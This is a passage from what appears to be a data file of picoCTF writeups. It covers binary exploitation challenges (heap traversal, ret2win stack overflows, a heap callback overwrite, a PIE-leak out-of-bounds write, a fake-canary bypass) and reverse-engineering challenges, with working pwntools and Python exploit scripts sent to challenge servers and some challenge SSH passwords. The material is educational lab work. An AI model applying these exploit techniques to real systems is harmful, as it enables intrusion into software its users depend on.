- asks you to provide the expected free-list traversal addresses

## 2) Connect to remote

\`\`\`bash
nc candy-mountain.picoctf.net 50072
\`\`\`

Read the printed tcache head:
- \`tcache head (start of free list) -> 0x...\`

## 3) Compute required addresses

Chunk stride is:
- \`0x80\` user data + \`0x10\` metadata = \`0x90\`

Enter six addresses:
- \`head + 0x000\`
- \`head + 0x090\`
- \`head + 0x120\`
- \`head + 0x1b0\`
- \`head + 0x240\`
- \`head + 0x2d0\`

Helper:

\`\`\`bash
python3 - << 'PY'
head = int('0x1fc1490',16)
for d in [0,0x90,0x120,0x1b0,0x240,0x2d0]:
    print(hex(head+d))
PY
\`\`\`

## 4) Submit and get flag

After correct traversal, service prints \`Correct traversal! Flag: ...\`

## Note about local behavior

Local glibc may use safe-linking and break this exact pointer expectation, while remote instance was solvable with plain traversal.

## Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "04-echo-escape-1-writeup",
    title: "Echo Escape 1 Writeup",
    excerpt: "picoCTF Echo Escape 1 writeup leveraging format string bugs in an echo service to read sensitive memory and extract the flag.",
    category: "picoCTF - Binary Exploitation",
    content: `# Echo Escape 1 Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`vuln (2)\`, \`vuln (2).c\`
- Tools:
- \`file\`
- \`checksec\`
- \`objdump\`
- \`python3\`
- \`nc\`

## 1) Inspect binary

\`\`\`bash
file "vuln (2)"
checksec --file="vuln (2)"
\`\`\`

## 2) Find \`win()\` address

\`\`\`bash
objdump -d "vuln (2)" | rg "<win>"
\`\`\`

Used address:
- \`0x401256\`

## 3) Compute RIP offset

\`\`\`bash
objdump -d "vuln (2)" | sed -n '/<main>:/,/^$/p'
\`\`\`

Offset calculation:
- buffer \`32\` bytes
- saved \`RBP\` \`8\` bytes
- saved RIP offset = \`40\`

## 4) Build payload

\`\`\`text
"A" * 40 + p64(0x401256)
\`\`\`

## 5) Exploit remote

\`\`\`bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*40 + struct.pack("<Q",0x401256))' | nc mysterious-sea.picoctf.net 53046
\`\`\`

## Why it works

\`read(0, buf, 128)\` overflows \`buf[32]\` and overwrites return address with \`win()\`.

## Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "05-heap-havoc-writeup",
    title: "Heap Havoc Writeup",
    excerpt: "picoCTF Heap Havoc writeup exploiting heap memory management flaws including use-after-free or heap overflow to gain code execution.",
    category: "picoCTF - Binary Exploitation",
    content: `# Heap Havoc Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`vuln (3)\`, \`vuln (3).c\`
- Tools:
- \`file\`
- \`checksec\`
- \`objdump\`
- \`python3\`
- \`pwntools\`
- \`nc\`

## 1) Review vulnerability

Source behavior:
- \`i1->name = malloc(8)\`
- \`i2->name = malloc(8)\`
- \`strcpy(i1->name, argv[1])\` and \`strcpy(i2->name, argv[2])\`

Unbounded \`strcpy\` allows overflowing from \`i1->name\` into \`i2\`, including \`i2->callback\`.

## 2) Find \`winner()\` address

\`\`\`bash
objdump -d "vuln (3)" | rg "<winner>"
\`\`\`

Used:
- \`winner = 0x080492b6\`

## 3) Build overwrite strategy

Goal:
- keep \`i2->name\` valid enough for second \`strcpy\`
- set \`i2->callback = winner\`

Because heap layout can shift, use a short brute-force over padding length.

## 4) Exploit with pwntools

\`\`\`python
from pwn import *

win = 0x080492b6
name_ptr = 0x0804c041

for off in range(8, 40):
    io = remote('foggy-cliff.picoctf.net', 50888)
    io.recvuntil(b'space:')
    arg1 = b'A'*off + b'PPPP' + p32(name_ptr) + p32(win)
    arg2 = b'BBBB'
    io.sendline(arg1 + b' ' + arg2)
    out = io.recvrepeat(1)
    if b'picoCTF{' in out:
        print(out.decode('latin-1','replace'))
        break
    io.close()
\`\`\`

Working offset in solved run:
- \`16\`

## Why it works

Overflow corrupts \`i2\` object fields, callback becomes non-null and points to \`winner\`, then \`if (i2->callback) i2->callback();\` executes flag function.

## Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "06-pizza-router-writeup",
    title: "Pizza Router Writeup",
    excerpt: "picoCTF Pizza Router writeup exploiting a routing application through buffer overflow or command injection to capture the flag.",
    category: "picoCTF - Binary Exploitation",
    content: `# Pizza Router Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`router\`, \`city1.map\`, \`city2.map\`, \`city3.map\`
- Tools:
- \`file\`
- \`checksec\`
- \`strings\`
- \`nm\`
- \`objdump\`
- \`python3\`
- \`pwntools\`
- \`nc\`

## 1) Recon the binary

\`\`\`bash
file router
checksec --file=router
strings -n 4 router | rg "help|add_order|reroute|replay|receipt|dispatch"
nm -n router
\`\`\`

Findings:
- PIE enabled
- hidden \`win\` at offset \`0x2460\`
- command surface includes leaks + mutation operations

## 2) Identify useful leaks and bug

From reversing behavior:
- \`replay <id>\` leaks callback pointer: \`renderer=%p\` (PIE leak)
- \`receipt <id>\` leaks state pointer: \`hint=%p\` (heap leak)
- \`reroute <id> <heap_idx> <new_cost>\` has out-of-bounds index behavior

## 3) Exploit plan

1. Create order.
2. Leak renderer pointer and compute PIE base.
3. Leak state pointer.
4. Use OOB writes to redirect callback to \`win()\`.
5. Trigger callback via \`dispatch\`.

## 4) Key offsets used

- \`base = renderer - 0x2260\`
- \`win = base + 0x2460\`
- write base in state: \`state + 0x18\`
- callback target: \`state + 0x438\`
- callback index: \`(0x438 - 0x18)/8 = 132\`

## 5) Working exploit script

\`\`\`python
from pwn import *
import re

HOST='mysterious-sea.picoctf.net'
PORT=65154

def i32(x):
    x &= 0xffffffff
    return x if x < 0x80000000 else x-0x100000000

io = remote(HOST, PORT)
io.recvuntil(b'router> ')

def cmd(s):
    io.sendline(s)
    return io.recvuntil(b'router> ', drop=True)

out = cmd(b'add_order 1 1')
oid = int(re.search(rb'order #(\\d+)', out).group(1))

rep = cmd(f'replay {oid}'.encode())
renderer = int(re.search(rb'renderer=(0x[0-9a-fA-F]+)', rep).group(1),16)
base = renderer - 0x2260
win = base + 0x2460

rcpt = cmd(f'receipt {oid}'.encode())
state = int(re.search(rb'hint=(0x[0-9a-fA-F]+)', rcpt).group(1),16)

heap_base = state + 0x18
ord0 = base + 0x5080
idx_to_ord0 = (ord0 - heap_base)//8

x_over = ((win & 0xffffffff) - 16) & 0xffffffff
cmd(f'reroute {oid} {idx_to_ord0} {i32(x_over)}'.encode())
cmd(f'reroute 17 132 {i32((win>>32)&0xffffffff)}'.encode())

out = cmd(b'dispatch 17')
print(out.decode('latin-1','replace'))
\`\`\`

## 6) Result

The challenge instance returned:
- \`flag{<redacted>}\`

Note: this instance returned \`flag{<redacted>}\` format (not \`picoCTF{<redacted>}\`).
`,
  },
  {
    id: "07-offset-cycle-writeup",
    title: "offset-cycle Writeup",
    excerpt: "picoCTF Offset Cycle writeup solving a binary exploitation challenge involving cyclic offset calculation and return address control.",
    category: "picoCTF - Binary Exploitation",
    content: `# offset-cycle Writeup

## Challenge

SSH target:

\`\`\`bash
ssh -p 59476 ctf-player@green-hill.picoctf.net
\`\`\`

Password:

\`\`\`text
83dcefb7
\`\`\`

## Goal

Exploit the generated SUID binary within 120 seconds and recover the flag.

## Remote Setup

After logging in, the home directory contained:

- \`instructions.txt\`
- \`start\`
- \`CodeBank/\` (not directly readable)

The instructions explained the flow:

1. Run \`./start\`
2. It copies a generated C source file and compiled binary into the current directory
3. The files are deleted after 120 seconds
4. If the binary is exploited in time, it reveals the flag

## Generated Instance

Running \`./start\` produced:

- \`11.c\`
- \`11\`

The generated C source was:

\`\`\`c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "CodeBank/asm.h"

#define BUFSIZE 68
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("CodeBank/flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "You may not have plenty of time",
                    "to solve the challenge.\\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\\n", get_return_address());
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
\`\`\`

## Vulnerability

This is a classic ret2win challenge:

- \`gets(buf)\` allows unbounded stack input
- \`win()\` prints the flag from \`CodeBank/flag.txt\`
- the binary is 32-bit and non-PIE, so the \`win()\` address is fixed

Security properties of the generated binary:

\`\`\`text
Arch: i386
RELRO: Partial RELRO
Canary: No
NX: Stack executable
PIE: No
Stripped: No
\`\`\`

## Important Addresses

From \`nm -n 11\`:

\`\`\`text
080491f6 T win
08049281 T vuln
080492c4 T main
\`\`\`

So the target address was:

\`\`\`text
win = 0x080491f6
\`\`\`

## Offset Calculation

At first glance the source suggests:

- \`buf[68]\`
- saved \`ebp\` = 4 bytes
- return address after 72 bytes

But the compiled binary had extra stack layout due to a saved \`ebx\`.

Disassembly of \`vuln\`:

\`\`\`asm
08049281 <vuln>:
  push   ebp
  mov    ebp, esp
  push   ebx
  sub    esp, 0x54
  ...
  lea    eax, [ebp-0x4c]
  push   eax
  call   gets
  ...
  leave
  ret
\`\`\`

The buffer starts at \`ebp-0x4c\`.

Distance from \`ebp-0x4c\` to saved return address at \`ebp+4\`:

\`\`\`text
0x4c + 0x4 = 0x50 = 80 bytes
\`\`\`

So the correct overwrite offset is:

\`\`\`text
80
\`\`\`

## Exploit

Payload structure:

\`\`\`text
"A" * 80 + p32(0x080491f6)
\`\`\`

One-liner used on the remote host:

\`\`\`bash
python3 - <<'PY' | ./11
import sys, struct
payload = b'A'*80 + struct.pack('<I', 0x080491f6)
sys.stdout.buffer.write(payload)
PY
\`\`\`

## Result

The binary returned into \`win()\` and printed:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Final Answer

Flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Takeaway

The only real pitfall was trusting the C source buffer size too literally. The generated 32-bit function saved \`ebx\`, which shifted the real return-address offset from \`72\` to \`80\`. Once the compiled stack frame was checked, the exploit was a direct ret2win.
`,
  },
  {
    id: "08-offset-cyclev2-writeup",
    title: "offset-cycleV2 Writeup",
    excerpt: "picoCTF Offset Cycle V2 writeup building on the first version with additional protections requiring more advanced exploitation techniques.",
    category: "picoCTF - Binary Exploitation",
    content: `# offset-cycleV2 Writeup

## Challenge

SSH target:

\`\`\`bash
ssh -p 51554 ctf-player@dolphin-cove.picoctf.net
\`\`\`

Password:

\`\`\`text
83dcefb7
\`\`\`

## Goal

Run the generator, exploit the per-instance binary before the timeout, and recover the flag.

## Instance Flow

After login, \`instructions.txt\` explained:

1. Run \`./start\`
2. It copies a generated source file and binary into the current directory
3. You have 80 seconds to exploit it

Running \`./start\` produced:

- \`28.c\`
- \`28\`

## Generated Source

\`\`\`c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFSIZE 609
#define CANARY_SIZE 4
#define FLAGSIZE 64

char global_canary[CANARY_SIZE];

void win() {
    char flag[FLAGSIZE];
    FILE *f = fopen("CodeBank/flag.txt", "r");

    if (!f) {
        puts("Missing flag.txt.");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    puts(flag);
}

void load_canary() {
    FILE *f = fopen("CodeBank/flag.txt", "r");

    if (!f) {
        puts("Missing flag.txt.");
        exit(0);
    }

    fread(global_canary, 1, CANARY_SIZE, f);
    fclose(f);
}

void vuln() {
    char local_canary[CANARY_SIZE];
    char buf[BUFSIZE];
    char input[BUFSIZE];
    int count, i = 0;

    memcpy(local_canary, global_canary, CANARY_SIZE);

    printf("How many bytes?\\n> ");
    while (i < BUFSIZE && read(0, &input[i], 1) == 1 && input[i] != '\\n')
        i++;

    sscanf(input, "%d", &count);

    printf("Input> ");
    read(0, buf, count);

    if (memcmp(local_canary, global_canary, CANARY_SIZE) != 0) {
        puts("***** Stack Smashing Detected *****");
        exit(0);
    }

    puts("Ok... Now Where's the flag?");
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setresgid(getegid(), getegid(), getegid());

    load_canary();
    vuln();
    return 0;
}
\`\`\`

## Vulnerability

The bug is the unchecked \`read(0, buf, count)\`.

\`count\` is attacker-controlled, so the program allows a classic stack overflow. The only barrier is the custom 4-byte canary copied from the first 4 bytes of \`CodeBank/flag.txt\`.

The key weakness is that picoCTF flags begin with \`pico\`, so the canary is predictable.

## Binary Properties

\`\`\`text
Arch: i386
RELRO: Partial RELRO
Canary: No compiler canary
NX: Enabled
PIE: No
Stripped: No
\`\`\`

## Important Addresses

From \`nm -n 28\`:

\`\`\`text
08049316 T win
08049411 T vuln
0804952c T main
\`\`\`

Target:

\`\`\`text
win = 0x08049316
\`\`\`

## Real Stack Layout

The compiled \`vuln\` function placed:

- \`buf\` at \`ebp-0x271\`
- \`local_canary\` at \`ebp-0x10\`
- saved return address at \`ebp+4\`

From the disassembly:

\`\`\`asm
lea eax,[ebp-0x271]   ; buf
lea eax,[ebp-0x10]    ; local_canary
\`\`\`

So:

- offset from \`buf\` to \`local_canary\` = \`0x271 - 0x10 = 0x261 = 609\`
- offset from \`buf\` to saved return address = \`0x271 + 4 = 0x275 = 629\`

That means the payload must be:

1. \`609\` bytes padding
2. correct 4-byte canary: \`pico\`
3. \`16\` bytes filler
4. \`win()\` address

## Exploit

Working remote payload:

\`\`\`bash
python3 - <<'PY' | ./28
import sys, struct
count = 609 + 4 + 16 + 4
payload = b'A'*609 + b'pico' + b'B'*16 + struct.pack('<I', 0x08049316)
sys.stdout.write(str(count) + '\\n')
sys.stdout.flush()
sys.stdout.buffer.write(payload)
PY
\`\`\`

## Result

The exploit printed:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Final Answer

Flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Takeaway

This was a ret2win with a fake manual canary. The only trick was recognizing that the canary came from the first four bytes of the flag file, which are predictably \`pico\` on picoCTF instances. Once that was supplied in the overflow, control flow could be redirected directly into \`win()\`.
`,
  },
  {
    id: "01-hidden-cipher-1-writeup",
    title: "Hidden Cipher 1 Writeup",
    excerpt: "picoCTF Hidden Cipher 1 writeup reversing an encryption algorithm to decode the hidden flag from ciphertext output.",
    category: "picoCTF - Reverse Engineering",
    content: `# Hidden Cipher 1 Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`hiddencipher.zip\`, extracted \`hiddencipher\`
- Tools:
- \`unzip\`
- \`file\`
- \`checksec\`
- \`upx\`
- \`nm\`
- \`objdump\`
- \`nc\`
- \`python3\`

## 1) Extract and inspect

\`\`\`bash
unzip -l hiddencipher.zip
unzip -o hiddencipher.zip -d /tmp/hiddencipher_work
file /tmp/hiddencipher_work/hiddencipher
checksec --file=/tmp/hiddencipher_work/hiddencipher
\`\`\`

Binary was UPX-packed.

## 2) Unpack and reverse

\`\`\`bash
upx -d /tmp/hiddencipher_work/hiddencipher -o /tmp/hiddencipher_work/hiddencipher.unpacked
nm -n /tmp/hiddencipher_work/hiddencipher.unpacked
objdump -d -Mintel --start-address=0x12a9 --stop-address=0x148c /tmp/hiddencipher_work/hiddencipher.unpacked
\`\`\`

Recovered behavior:
- key built in \`get_secret\`: \`S3Cr3t\`
- output is hex of \`flag[i] XOR key[i % 6]\`

## 3) Get remote ciphertext

\`\`\`bash
nc candy-mountain.picoctf.net 61607
\`\`\`

Captured ciphertext hex:
- \`235a201d702015483b1d412b265d3313501f0c072d135f0d2002302d01156a57224306172e\`

## 4) Decrypt

\`\`\`bash
python3 - << 'PY'
ct = bytes.fromhex('235a201d702015483b1d412b265d3313501f0c072d135f0d2002302d01156a57224306172e')
key = b'S3Cr3t'
pt = bytes([b ^ key[i % len(key)] for i, b in enumerate(ct)])
print(pt.decode())
PY
\`\`\`

## Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "02-hidden-cipher-2-writeup",
    title: "Hidden Cipher 2 Writeup",
    excerpt: "picoCTF Hidden Cipher 2 writeup tackling a more complex cipher implementation requiring deeper static analysis to reverse the encoding.",
    category: "picoCTF - Reverse Engineering",
    content: `# Hidden Cipher 2 Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Tools:
- \`nc\`
- \`python3\`

## 1) Connect and pass gate prompt

\`\`\`bash
nc crystal-peak.picoctf.net 62957
\`\`\`

Prompt asked:
- \`What is 8 - 1?\`
- answer: \`7\`

## 2) Observe encoding rule

Service prints integer list like:
- \`784, 735, 693, ...\`

Check first value:
- \`784 / 7 = 112\` -> ASCII \`p\`

So encoding is:
- \`encoded = ascii * 7\`

## 3) Decode all numbers

\`\`\`bash
python3 - << 'PY'
vals=[784,735,693,777,469,588,490,861,763,364,812,728,665,686,357,728,343,770,700,665,693,343,784,728,357,798,665,357,343,392,371,707,700,350,707,875]
print(''.join(chr(v//7) for v in vals))
PY
\`\`\`

## Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "03-bypass-me-writeup",
    title: "Bypass Me Writeup",
    excerpt: "picoCTF Bypass Me writeup patching or reversing binary validation logic to bypass authentication checks and reveal the flag.",
    category: "picoCTF - Reverse Engineering",
    content: `# Bypass Me Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Remote file: \`bypassme.bin\`
- Tools:
- \`ssh\`
- \`scp\`
- \`file\`
- \`checksec\`
- \`nm\`
- \`strings\`
- \`objdump\`
- \`python3\`

## 1) Connect and fetch binary

\`\`\`bash
ssh -p 50568 ctf-player@foggy-cliff.picoctf.net
# password: f3b61b38
scp -P 50568 ctf-player@foggy-cliff.picoctf.net:/home/ctf-player/bypassme.bin /tmp/bypassme.bin
\`\`\`

## 2) Inspect symbols and strings

\`\`\`bash
file /tmp/bypassme.bin
checksec --file=/tmp/bypassme.bin
nm -n /tmp/bypassme.bin
strings -n 3 /tmp/bypassme.bin | rg "Raw Input|Sanitized|flag|Denied"
\`\`\`

Key functions:
- \`_Z15decode_passwordPc\`
- \`_Z8sanitizePKcPc\`
- \`_Z13auth_sequencev\`
- \`main\`

## 3) Reverse decode routine

\`\`\`bash
objdump -d -Mintel --start-address=0x1333 --stop-address=0x1457 /tmp/bypassme.bin
\`\`\`

Decoded bytes are XORed with \`0xAA\` from constants:
- \`f9 df da cf d8 f9 cf c9 df d8 cf\`

Decode:

\`\`\`bash
python3 - << 'PY'
enc = bytes.fromhex('f9dfdacfd8f9cfc9dfd8cf')
print(bytes([b ^ 0xaa for b in enc]).decode())
PY
\`\`\`

Password recovered:
- \`SuperSecure\`

## 4) Verify comparison target in \`main\`

\`\`\`bash
objdump -d -Mintel --start-address=0x162e --stop-address=0x1840 /tmp/bypassme.bin
\`\`\`

Important behavior:
- sanitizer output is shown
- auth compare uses raw input against decoded password

## 5) Authenticate remotely

\`\`\`bash
ssh -p 50568 ctf-player@foggy-cliff.picoctf.net
./bypassme.bin
# Enter: SuperSecure
\`\`\`

## Final password

\`SuperSecure\`

## Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "04-add-on-trap-writeup",
    title: "Add/On Trap Writeup",
    excerpt: "picoCTF Add On Trap writeup analyzing a binary with anti-debugging traps and reversing the validation to extract the correct flag.",
    category: "picoCTF - Reverse Engineering",
    content: `# Add/On Trap Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- File: \`suspicious.zip\` (password: \`picoctf\`)
- Extracted artifact: \`.xpi\` extension
- Tools:
- \`unzip\`
- \`sed\`
- \`rg\`
- \`python3\`
- \`cryptography.fernet\`

## 1) Extract archive and extension

\`\`\`bash
unzip -P picoctf -l suspicious.zip
unzip -P picoctf -o suspicious.zip -d /tmp/suspicious_work
unzip -o /tmp/suspicious_work/56102ec0438646c68605-1.0.xpi -d /tmp/suspicious_work/xpi
\`\`\`

## 2) Read extension JS

\`\`\`bash
sed -n '1,260p' /tmp/suspicious_work/xpi/background/main.js
sed -n '1,260p' /tmp/suspicious_work/xpi/assets/script.js
\`\`\`

Found:
- Fernet key string
- Fernet ciphertext token

## 3) Decrypt token with key

\`\`\`bash
python3 - << 'PY'
from cryptography.fernet import Fernet
key=b'cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0='
tok=b'gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE'
print(Fernet(key).decrypt(tok).decode())
PY
\`\`\`

## Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "05-silent-stream-writeup",
    title: "Silent Stream Writeup",
    excerpt: "picoCTF Silent Stream writeup recovering hidden data from a binary that outputs the flag through non-obvious channels or side effects.",
    category: "picoCTF - Reverse Engineering",
    content: `# Silent Stream Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`packets.pcap\`, \`encrypt.py\`
- Tools:
- \`file\`
- \`sed\`
- \`tshark\`
- \`python3\`

## 1) Inspect provided files

\`\`\`bash
file packets.pcap encrypt.py
sed -n '1,260p' encrypt.py
\`\`\`

\`encrypt.py\` shows byte encoding:
- \`encode_byte(b, key) = (b + key) % 256\`
- key used: \`42\`

## 2) Extract TCP payload bytes

\`\`\`bash
tshark -r packets.pcap -T fields -e tcp.payload
\`\`\`

Concatenate non-empty payload lines as hex.

## 3) Reverse transform and rebuild file

\`\`\`bash
python3 - << 'PY'
import subprocess
out = subprocess.check_output(['tshark','-r','packets.pcap','-T','fields','-e','tcp.payload'], text=True)
hexstr = ''.join(line.strip() for line in out.splitlines() if line.strip())
enc = bytes.fromhex(hexstr)
dec = bytes((b - 42) % 256 for b in enc)
open('/tmp/silent_stream_decoded.jpg','wb').write(dec)
print('decoded bytes:', len(dec))
PY
\`\`\`

## 4) Verify output type

\`\`\`bash
file /tmp/silent_stream_decoded.jpg
\`\`\`

Then open image and read flag text.

## Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "06-autorev-1-writeup",
    title: "Autorev 1 Writeup",
    excerpt: "picoCTF AutoRev 1 writeup using automated reverse engineering tools like angr or Z3 to solve constraint-based flag validation.",
    category: "picoCTF - Reverse Engineering",
    content: `# Autorev 1 Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Remote service only
- Tools:
- \`nc\`
- \`python3\`
- \`pwntools\`

## Challenge behavior

Service sends 20 rounds.
Each round includes:
- a leaked integer line
- a hex-encoded ELF blob
- prompt: \`What's the secret?:\`

## Key observation

The leaked integer printed before each blob is already the required answer for that round.
So fastest solve is to parse and send it directly.

## Working solver

\`\`\`python
from pwn import remote
import re

io = remote('mysterious-sea.picoctf.net', 61817)

chunk = io.recvuntil(b"Here's the next binary in bytes:\\n")
nums = re.findall(rb'\\n(\\d+)\\n', b'\\n' + chunk)
cur = nums[-1]

for r in range(1, 21):
    _ = io.recvline().strip()
    io.recvuntil(b"What's the secret?:")
    io.sendline(cur)

    if r == 20:
        break

    chunk = io.recvuntil(b"Here's the next binary in bytes:\\n")
    nums = re.findall(rb'\\n(\\d+)\\n', b'\\n' + chunk)
    cur = nums[-1]

print(io.recvrepeat(2).decode('latin-1','replace'))
io.close()
\`\`\`

## Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "07-secure-password-database-writeup",
    title: "Secure Password Database Writeup",
    excerpt: "picoCTF Secure Password Database writeup reversing a password database application to extract stored credentials and recover the flag.",
    category: "picoCTF - Reverse Engineering",
    content: `# Secure Password Database Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- File: \`system.out\`
- Tools:
- \`file\`
- \`checksec\`
- \`strings\`
- \`nm\`
- \`objdump\`
- \`python3\`
- \`nc\`

## 1) Inspect binary and symbols

\`\`\`bash
file system.out
checksec --file=system.out
strings -n 3 system.out
nm -n system.out
\`\`\`

Interesting functions:
- \`hash\`
- \`make_secret\`
- \`main\`

## 2) Reverse auth logic

\`\`\`bash
objdump -d -Mintel --start-address=0x1309 --stop-address=0x13d0 system.out
objdump -d -Mintel --start-address=0x13d0 --stop-address=0x1754 system.out
objdump -s --start-address=0x2000 --stop-address=0x2200 system.out
\`\`\`

Observed bug:
- program asks your password and hash
- but compares input hash against hash of internal decoded secret, not your password

## 3) Recover internal secret

\`make_secret\` XOR-decodes obfuscated bytes with \`0xAA\`.

Obfuscated bytes:
- \`c3 ff c8 c2 92 9b 8b c0 80 c2 c4 8b\`

Decode:

\`\`\`bash
python3 - << 'PY'
obf = bytes.fromhex('c3ffc8c2929b8bc080c2c48b')
print(bytes([b ^ 0xAA for b in obf]).decode())
PY
\`\`\`

Recovered secret:
- \`iUbh81!j*hn!\`

## 4) Reproduce hash function

From reverse:
- seed = \`0x1505\`
- loop = \`h = h*33 + byte\` (64-bit wrap)

\`\`\`bash
python3 - << 'PY'
h = 0x1505
for b in b'iUbh81!j*hn!':
    h = (h*33 + b) & 0xffffffffffffffff
print(h)
PY
\`\`\`

Computed hash:
- \`15237662580160011234\`

## 5) Authenticate remotely

\`\`\`bash
nc candy-mountain.picoctf.net 54587
\`\`\`

Use any password text, then provide hash:
- \`15237662580160011234\`

## Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "08-bin-ins3-writeup",
    title: "Binary Instrumentation 3 (bin-ins3.zip) Writeup",
    excerpt: "picoCTF Binary Instrumentation 3 writeup using dynamic binary instrumentation tools like Frida or Pin to trace and solve the challenge.",
    category: "picoCTF - Reverse Engineering",
    content: `# Binary Instrumentation 3 (bin-ins3.zip) Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

I only used local static-analysis tools:

- \`7z\`
- \`file\`
- \`rabin2\`
- \`objdump\`
- \`strings\`
- \`xxd\`
- \`od\`
- \`python3\` standard library (\`lzma\`, \`base64\`)

I did not need debugger patching to recover the final flag.

## 1) Unzip the challenge and inspect the executable

\`\`\`bash
7z x -p'picoctf' bin-ins3.zip
file bin-ins.exe
\`\`\`

Result:
- \`bin-ins.exe\` is a 64-bit Windows PE executable.

## 2) Look at the PE sections

\`\`\`bash
rabin2 -S bin-ins.exe
\`\`\`

Important output:
- normal sections like \`.text\`, \`.rdata\`, \`.data\`, \`.rsrc\`, \`.reloc\`
- one suspicious large custom section: \`.ATOM\`

\`.ATOM\` details:
- file offset (\`paddr\`) = \`0x6000\`
- file size = \`0x6fe00\`

Working theory:
- outer executable is a loader
- real payload is hidden in \`.ATOM\`

## 3) Extract the \`.ATOM\` section

\`\`\`bash
dd if=bin-ins.exe of=atom.bin bs=1 skip=$((0x6000)) count=$((0x6fe00)) status=none
\`\`\`

## 4) Check whether \`.ATOM\` is compressed

\`\`\`bash
od -Ax -tx1 -N 32 atom.bin
\`\`\`

Beginning bytes:
- \`5d 00 00 10 00 ...\`

This matches LZMA “alone” header structure:
- first byte = properties (\`0x5d\`)
- next 4 bytes = dictionary size

## 5) Decompress hidden payload with Python

\`\`\`python
import lzma

data = open("atom.bin", "rb").read()
dec = lzma.decompress(data, format=lzma.FORMAT_ALONE)
open("inner.bin", "wb").write(dec)
\`\`\`

Then verify:

\`\`\`bash
file inner.bin
\`\`\`

Result:
- \`inner.bin\` is another PE executable.

Confirmed structure:
- \`bin-ins.exe\` = outer wrapper
- \`.ATOM\` = compressed payload
- \`inner.bin\` = real challenge logic

## 6) Inspect the inner executable

Search for relevant strings:

\`\`\`bash
strings -n 5 inner.bin | grep -E "output_flag|cmd.exe /c echo|flagParts|cGljb0NURns0|MTFfNHIzXzRw|MTVfbjA3aDFu|OV8zbDUzXzRm|NzA2NDBlfQo="
\`\`\`

Recovered:
- \`C:\\random\\output_flag.txt\`
- \`cmd.exe /c echo testing if redirection works\`
- \`cmd.exe /c echo\`
- \`_ZL9flagParts\`
- encoded fragments:
- \`cGljb0NURns0\`
- \`MTFfNHIzXzRw\`
- \`MTVfbjA3aDFu\`
- \`OV8zbDUzXzRm\`
- \`NzA2NDBlfQo=\`

From static code/strings, logic is:
- program attempts to create/open output file
- runs command with redirected output
- uses a broken handle comparison (the “messed up” part)
- intended flag text is assembled from \`flagParts\` fragments

## 7) Decode the Base64 fragments

\`\`\`python
import base64

parts = [
    b'cGljb0NURns0',
    b'MTFfNHIzXzRw',
    b'MTVfbjA3aDFu',
    b'OV8zbDUzXzRm',
    b'NzA2NDBlfQo='
]

flag = b''.join(base64.b64decode(p) for p in parts)
print(flag)
\`\`\`

Output:
- \`b'picoCTF{<redacted>}\\n'\`

Removing the trailing newline:
- \`picoCTF{<redacted>}\`

## 8) Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "09-binary-instrumentation-4-writeup",
    title: "Binary Instrumentation 4 (bin-ins4.zip) Writeup",
    excerpt: "picoCTF Binary Instrumentation 4 writeup applying advanced instrumentation techniques to hook functions and extract the flag at runtime.",
    category: "picoCTF - Reverse Engineering",
    content: `# Binary Instrumentation 4 (bin-ins4.zip) Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`bin-ins4.zip\`, extracted \`bin-ins.exe\`
- Tools:
- \`7z\`
- \`file\`
- \`rabin2\`
- \`objdump\`
- \`strings\`
- \`dd\`
- \`python3\` (\`lzma\`, \`base64\`)

## 1) Unzip and inspect the outer binary

\`\`\`bash
7z x -p'picoctf' bin-ins4.zip
file bin-ins.exe
\`\`\`

Result:
- \`bin-ins.exe\` is a 64-bit Windows PE.

## 2) Inspect PE sections

